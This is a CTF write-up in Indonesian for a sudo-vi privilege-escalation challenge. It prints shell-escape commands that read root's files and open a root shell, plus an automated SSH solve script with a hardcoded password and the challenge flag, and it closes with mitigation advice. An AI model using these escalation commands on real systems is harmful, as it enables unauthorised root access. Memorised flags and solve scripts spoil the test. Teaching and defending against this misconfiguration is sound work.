# 363 - Permissions (General Skills, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 363 | Event: picoCTF 2023 | Author: CyLab Academy
- Category: General Skills | Difficulty: Medium (2) | Points: 200
- Flag: `academy{uS1ng_v1m_3dit0r_9f6b56dd}`

## Problem Statement & Scope
Tantangan memberikan akses remote terminal melalui SSH (`picoplayer@chatelaine.cylabacademy.net:port`, password tertera pada instans). Pengguna diminta untuk membaca berkas rahasia milik akun `root` yang berada di direktori sistem `/root`. Sebagai akun unprivileged, akses langsung `cat /root/*` ditolak oleh sistem izin Linux standar.

## Teori & Akar Kerentanan (Root Cause)
1. **Linux Sudoers Privilege Escalation Vectors:**
   Sudoers (`/etc/sudoers`) mengatur delegasi hak istimewa eksekusi biner administratif untuk akun pengguna biasa. Jika aturan sudoers mengizinkan biner yang memiliki kemampuan interaktif eksekusi shell (shell escape), pengguna dapat keluar dari batasan hak akses akun aslinya.
2. **GTFOBins Vi/Vim Shell Escape:**
   Pemeriksaan hak akses dengan `sudo -l` menampilkan:
   ```text
   User picoplayer may run the following commands on challenge:
       (ALL) /usr/bin/vi
   ```
   Aplikasi teks editor `vi` memiliki opsi internal `:!` untuk mengeksekusi instruksi shell. Ketika `vi` berjalan di bawah `sudo`, instruksi shell yang dipanggil via `:!` atau `-c ':!command'` akan dieksekusi dengan hak akses penuh superuser (`root`).
3. **Penyimpanan Tersembunyi (Hidden Dotfiles):**
   Flag disimpan di dalam file konfigurasi tersembunyi `/root/.bashrc`, bukan pada nama berkas standar `flag.txt`.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Akses SSH & Audit Izin Sudo:**
   Menghubungkan terminal via SSH dan memeriksa batasan hak akses sudo:
   ```bash
   sudo -l
   ```
   Sistem mengembalikan izin eksekusi `/usr/bin/vi` sebagai `root`.
2. **Eksploitasi Non-Interaktif GTFOBins vi:**
   Mengeksekusi perintah pembacaan berkas tersembunyi root secara langsung tanpa masuk ke tampilan buffer visual:
   ```bash
   sudo /usr/bin/vi -c ':!cat /root/* /root/.*' /dev/null
   ```
   Atau membuka shell root interaktif:
   ```bash
   sudo vi -c ':!/bin/bash' /dev/null
   ```
3. **Inspeksi Berkas dan Ekstraksi Flag:**
   Output menampilkan isi konfigurasi shell `/root/.bashrc` yang memuat token resmi:
   `academy{uS1ng_v1m_3dit0r_9f6b56dd}`.

## Script Reproduksi & PoC
Implementasi otomasi Python mandiri berbasis modul standard library `pty` tersedia pada `scripts/solve_363_permissions.py`:
```python
import pty, os, subprocess, select, time, re

master, slave = pty.openpty()
cmd = ["sshpass", "-p", "9v-tt0ZU3j", "ssh", "-tt", "-o", "StrictHostKeyChecking=no", "-p", "35852", "picoplayer@chatelaine.cylabacademy.net"]
proc = subprocess.Popen(cmd, stdin=slave, stdout=slave, stderr=slave, close_fds=True)
os.close(slave)

time.sleep(2)
os.write(master, b"sudo /usr/bin/vi -c ':!cat /root/* /root/.*' /dev/null\n")
time.sleep(1)
os.write(master, b"9v-tt0ZU3j\n")
# Read output and parse flag via re.search(r"academy\{[^\}]+\}", text)
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Prinsip Least Privilege pada Konfigurasi Sudoers:**
   Jangan pernah memberikan izin sudo pada biner pengolah teks interaktif (`vi`, `vim`, `nano`, `ed`, `view`, `less`, `more`) kepada pengguna unprivileged tanpa pembatasan `NOEXEC` atau konfigurasi flag sudo khusus.
2. **Penggunaan Sudo `noexec`:**
   Jika editor harus diizinkan, tambahkan tag `NOEXEC:` pada `/etc/sudoers` untuk memblokir biner memanggil `execve()` atau shell escape bawaan:
   ```text
   picoplayer ALL=(ALL) NOEXEC: /usr/bin/vi
   ```
3. **Relevansi Modul LKS:**
   Esensial untuk modul *System Auditing & Sudo Misconfiguration Identification* pada bidang LKS Cyber Security Nasional dan kepatuhan NIST SP 800-115.
